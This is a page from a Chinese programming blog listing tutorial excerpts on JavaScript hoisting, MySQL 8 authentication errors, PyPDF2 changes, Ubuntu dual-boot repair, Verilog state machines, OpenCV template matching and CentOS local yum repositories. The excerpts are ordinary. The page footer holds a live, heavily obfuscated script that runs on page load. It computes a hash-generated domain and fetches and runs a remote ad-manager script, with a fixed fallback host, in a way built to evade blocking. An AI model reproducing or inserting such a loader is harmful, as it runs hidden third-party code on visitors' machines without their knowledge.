3.函数表达式代替函数声明：如果需要在变量赋值之前使用函数，可以使用函数表达式来替代函数声明。函数表达式可以根据需要进行调用，而不会受到变量提升的影响。
4.使用模块化规范：在较大的项目中，使用模块化规范（如CommonJS、ES Modules）可以有效地管理变量的作用域和导出/导入，从而减少变量提升带来的问题
5.遵循良好的编程实践：尽量避免在变量声明之前使用变量或调用函数，按照最佳实践将变量和函数的声明放在代码的顶部或合适的位置，以增加代码的可读性和可维护性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40c068fdd82a5bd946d2a0d873398b39/" rel="bookmark">
			安装Mysql测试本地连接报1251错误的原因及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现这个原因是mysql8之前的版本中加密规则是mysql_native_password，而在mysql8之后，加密规则是caching_sha2_password
解决方法：
解决问题方法有两种，一种是升级navicat驱动；一种是把mysql用户登录密码加密规则还原成mysql_native_password。
选择第二种操作
1.cmd,以管理员身份运行
2.进入mysql命令 ：mysql -uroot -p123456 （u后面是你的mysql用户名，p后面是你的密码）
3.执行后，输入如下后续各命令：
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '密码'; #修改加密规则 ALTER USER 'root'@'localhost' IDENTIFIED BY '密码' PASSWORD EXPIRE NEVER; #更新一下用户的密码 FLUSH PRIVILEGES; #刷新权限
4.再使用Navicate界面测试本地连接，连接正常
之后连接外部数据库，在Navicate界面将主机名改为外部连接数据库服务器的IP地址，也可以正常
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adc6f1a6be533dea9db60dbd22245c19/" rel="bookmark">
			求助Claude GPT | PyPDF2 亲测可用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		直接Copy网上流传最广的代码完成提取PDF转文本，十有八九报错！
流传的是旧版本用法，造成的问题是命令规则用法变化。
常见的报错：
1、读取PDF文档命令的变化：
去除PdfFileReader不可用，
改为PyPDF2.PdfReader(read_pdf)
**报错信息：
PyPDF2.errors.DeprecationError: PdfFileReader is deprecated and was removed in PyPDF2 3.0.0. Use PdfReader instead.
2、获取PDF文档页数的命令变化：
去除reader.getPage(page_number)不可用，
改为reader.pages[page_number]
PyPDF2.errors.DeprecationError: reader.getPage(pageNumber) is deprecated and was removed in PyPDF2 3.0.0. Use reader.pages[page_number] instead.
3、编码格式错误提示
location.writelines(extract_text)
UnicodeEncodeError: 'cp950' codec can't encode character
'\u2212' in position 0: illegal multibyte sequence
求助Claude GPT给出的修改建议
错误表示在写入提取的文本时,遇到了无法使用指定的编码'cp950'来编码文本中的某个字符。
具体是遇到了一个破折号字符'\u2212',它在Unicode中的编码无法用cp950来表示，所以抛出了UnicodeEncodeError。
可能的解决方案:
尝试使用其他编码格式来写入文件,比如'utf-8': #1 方案
location.writelines(extract_text.encode('utf-8'))
将无法编码的字符替换为可编码的字符: #2 方案
extract_text = extract_text.replace('\u2212', '-')
location.writelines(extract_text)
忽略无法编码的字符: #3 方案
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adc6f1a6be533dea9db60dbd22245c19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acea5934151a45c2d865f58580186f9d/" rel="bookmark">
			win10下安装Ubuntukylin&#43;修复Ubuntu引导&#43;双系统可选启动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为了方便以后给自己机器重装linux用，简单记录一下。如果有其他人有需要启动盘或者有其他问题可以留言。
1）安装Ubuntukylin
&lt;1&gt;先在win10下，鼠标右键我的电脑，点击管理，打开磁盘那一栏，可以把之前不用的磁盘卷删除（会自动合并），如果你不知道那些没有名字但又占了空间的磁盘是干嘛用的，那就不要乱删；然后如果要将F或者G之类的已经写了字母的盘拿出一个来给Ubuntu的话，注意提前将里面重要东西剪切到另一个盘中做好备份，然后这个盘先不要格式化，记住这个盘的已经使用大小和这个盘总空间的大小，不要再分区的时候将Ubuntu装错盘，就尴尬了。
&lt;2&gt;关机，将Ubuntukylin启动盘插入最外面的那个USB接口。
开机，然后在华硕标志出来后，马上一直不断按ESC（不是一直 按着，是不断点按）（我是华硕笔记本，其他参照各自型号）直到出现选择是否U盘启动的界面（如果有两个都是U盘启动装Ubuntu就选前面的那个，是EFI什么的），进入之后是下面这个星空界面，如果因为没有这个画面而失败，可能是启动盘没制作好。
,
&lt;3&gt;看好选择中文简体就可以，要么在语言一栏最上面，要么在最下面的）
&lt;4&gt;进入选择界面，左边的试用就是Live界面（类似于windows安装时常用的pe用于安装系统的界面），我们选择右边的安装（因为图是借用别人的，这里应该是不用选文字，具体记不清了，到时候看好就Ok）
&lt;5&gt;然后应该会有一个提示界面，有三个选项，依次告诉你，是否接通电源（不是必须，虽然20多分钟可以安完,，但最好要保证1小时以上电量），是否联网（必须，可以联无线但是只有输入密码不能输入账号不方便，最好找一个插上网线就自动联网的地方），还有一个选项忘记了应该不重要。这三个选项满足后两个就可以点下一步安装了。
&lt;6&gt;这步比较重要，选最下面的”其他选项“。
这里是借用的别人的图，实际上我遇见的这一页，最上面有一个与win10共存的选项，别选，依然选最下面的"其它选项"，如下面这张图选中的这个位置。
&lt;7&gt;然后记得还有一个比较重要步骤是分区，如下，实际上下面这张图中，弹出的创建分区对话框后面那个背景似得很大一处空白那里，其实有很多分区，就是你的磁盘使用情况，注意选择你之前选好的那个盘（只能通过已经使用的大小和本来的总大小来区分）。我的选择是，装Ubuntu之前win10里本来原有的F盘117G左右全拿出来，4.66G左右做swap交换区，38.03G左右做/home，74.51G左右做/，下一步。（注意分区一定计算好大小，第一次因为分错导致出现了一个0M的卷，结果后面是不能成功安装的，需要进入WIN10，我的电脑，鼠标右键，管理，存储，磁盘管理，将那几个已经分的区删掉自动合并以后，重新重复以上步骤再安一遍）
&lt;8&gt;选择实际位置就好，如果写地名的前几个字母（比如jinan）会自动给你弹出可能的地点，说明是联网滴，否则网络可能不太好。
&lt;9&gt;会有下面的界面，姓名，用户名，密码，要谨记，只能用英文和数字。最下面选自动登录还是登录时需要密码，随意，反正我是默认的，不一定是下面图中选的这个。确定下一步之后然后就是连网自动下载，大约在10多分钟到30分钟左右，有的地方会因为网速原因出现卡顿，不要急。
&lt;10&gt;然后应该安完了，或者有些其他我没提到的不是很重要的步骤，看情况来即可。安装完成以后，会提示是否重新启动计算机，选是，重新启动，不要管，这个时候应该是没有任何选择是要进入Ubuntu还是进入WIN10的引导，而是直接进Win10了，没关系，下面是如何修复引导。
2）修复Ubuntu引导
&lt;1&gt;关机，插入之前的启动盘，开机按ESC，进入选择U盘启动界面，有两个进入Ubuntu的，选前面那个什么EFI的，进入之后，还是类似这个界面。
我们这时，选择左边的试用，进入Live界面。
&lt;2&gt; 这是一个貌似Ubuntu的系统，从左边启动器一栏中找到terminal（就是那个输命令行的那个窗口），然后输入： sudo add-apt-repository ppa:yannubuntu/boot-repair
按回车键添加完毕后，再输入以下命令来更新系统软件源列表：
sudo apt-get update
然后，在终端中输入以下命令来安装boot-repair：
sudo apt-get install boot-repair
然后在dash（就是桌面左边任务栏最上面那个，点开以后有一个查询框的）中，查找boot-repair
启动它，点击recommanded repair按钮
（注意，在上面的某一步中，有一个地方需要在对话框中输入Y，
要么输入大写Y，要么输入小写y再加一个空格，仅有一个小写y在linux中不被认为是y）
接下来等待软件自动搜索并弹出一个软件框提示你在终端中输入命令，按要求一条一条的复制其中的命令到终端中执行。
（注意！有一个地方会停下，让你选择yes还是No类似对话框的地方，不能输入命令，
只能用制表符TAB来选择选项，用ENTER回车进入，对话框里内容大致意思是，问你是否将所有的两个引导grub都删除remove掉,
选No!然后下一步，继续按照提示复制命令到终端中执行。）
然后没什么需要注意的了，按步骤来就可以了,最后会告诉你修复引导（grub）成功了，并且告诉你让你重新启动计算机
如果重启以后发现直接进入win10可以改变BIOS启动顺序，然而一般情况下这些并不会遇到。
重新启动计算机之后，会发现有了进入哪个系统的选项。
（题外话，如果进入linux下不能自动挂载windows硬盘，可以进入win10关闭快速启动以后再试试看。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc3779469772fd85898cda207df28f25/" rel="bookmark">
			HDLbits---Circuits---Sequential Logic---Finite State Machines第四部分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Exams/ece241 2013 q8 module top_module ( input clk, input aresetn, // Asynchronous active-low reset input x, output z ); parameter start=2'b0, one=2'b01, two=2'b10, three=2'b11; reg[1:0] state,next_state; always@(posedge clk or negedge aresetn) begin if(aresetn==0) state&lt;=start; else state&lt;=next_state; end always@(*) begin case(state) start: begin if(x) next_state&lt;=one; else next_state&lt;=start; end one: begin if(x) next_state&lt;=one; else next_state&lt;=two; end two: begin if(x) next_state&lt;=three; else next_state&lt;=start; end three: begin if(x) next_state&lt;=one; else next_state&lt;=two; end default: begin next_state&lt;=start; end endcase end assign z=(next_state==three); endmodule 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc3779469772fd85898cda207df28f25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3cca42f546f6054bbf35c80a8a9fd0dc/" rel="bookmark">
			【OpenCv】模板匹配函数：cv2.matchTemplate
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、模板匹配的基本思想是将模板图像在目标图像上滑动逐一对比，通过统计的基本方法进行匹配，比如方差检验，相关性检验等方法来寻找最佳匹配。
2、OpenCv中实现了模板匹配的功能(详见：opencv文档)：
cv2.matchTemplate(image, templ, method[, result[, mask]]) -&gt; result "" 1)image: 用于搜索的输入图像，格式为uint8或者float32，大小为(W, H) 2)templ: 用于匹配的模板图像，与image格式相同，大小为(w, h) 3)result：输出的结果图像，每个像素点的值表示的是模板图像与输入图像不同位置通过method计算后的匹配值/相似程度，大小变为(W-w+1, H-h+1)，例如两个图像相同，最后的结果就是一个值 4)method：用于计算匹配结果的方法 "" 3、得到匹配结果以后，可以通过cv2.minMaxLoc函数找到匹配结果中的最大值或最小值，根据不同method即可找到最佳匹配的位置
min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(ret) "" min_val, max_val, min_loc, max_loc表示ret中的最小值，最大值以及最小值和最大值的位置 "" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfabf61121a648c45178a79dbeb36fc6/" rel="bookmark">
			【Linux】挂载CentOS 并配置 iso镜像文件为 yum 源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候会遇到内网安装CentOS时，运维人员总是最小化安装，但是当你安装其他应用的时候，例如：MySQL，Nginx， Redis 系统中缺少的依赖很多。目前只有把ISO安装文件作为yum源，这样在安装编译其他的应用的时候，就不会缺少依赖了。
要将 ISO 文件挂载为 YUM 源，您可以按照以下步骤进行操作：
首先，创建一个目录，用于挂载 ISO 文件。例如，创建一个名为 /mnt/iso 的目录：
sudo mkdir /mnt/iso 使用 mount 命令将 ISO 文件挂载到刚创建的目录中。假设 ISO 文件的路径为 /path/to/your.iso，执行以下命令：
sudo mount -o loop /path/to/your.iso /mnt/iso 确保 ISO 文件已成功挂载。您可以运行以下命令来检查挂载情况：
mount | grep /mnt/iso 如果命令输出了关于 ISO 文件的信息，表示挂载成功。
现在，您需要创建一个新的 YUM 源文件。在终端中使用文本编辑器（如 vi 或 nano）打开 /etc/yum.repos.d/ 目录中的一个新文件，例如 myiso.repo：
sudo nano /etc/yum.repos.d/myiso.repo 在编辑器中，输入以下内容：
[myiso] name=My ISO Repository baseurl=file:///mnt/iso # 注意，CentOS 8 的 repomd.xml 在 AppStream/repodata/repomd.xml，此文件包含有关 YUM 软件仓库中可用软件包的元数据信息。 enabled=1 gpgcheck=0 这将创建一个名为 [myiso] 的新 YUM 源，其中 baseurl 指向您挂载的 ISO 文件的路径，另外，本地配置 file:// + 绝对路径，ftp配置 ftp:// + 主机名或IP + 相对路径，http配置 http://+主机名或IP+相对路径。请注意，这里的 gpgcheck 设置为 0 是为了简化过程，但这会禁用对软件包的验证。如果需要更安全的设置，请参考相关文档进行设置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfabf61121a648c45178a79dbeb36fc6/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/113/">«</a>
	<span class="pagination__item pagination__item--current">114/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/115/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>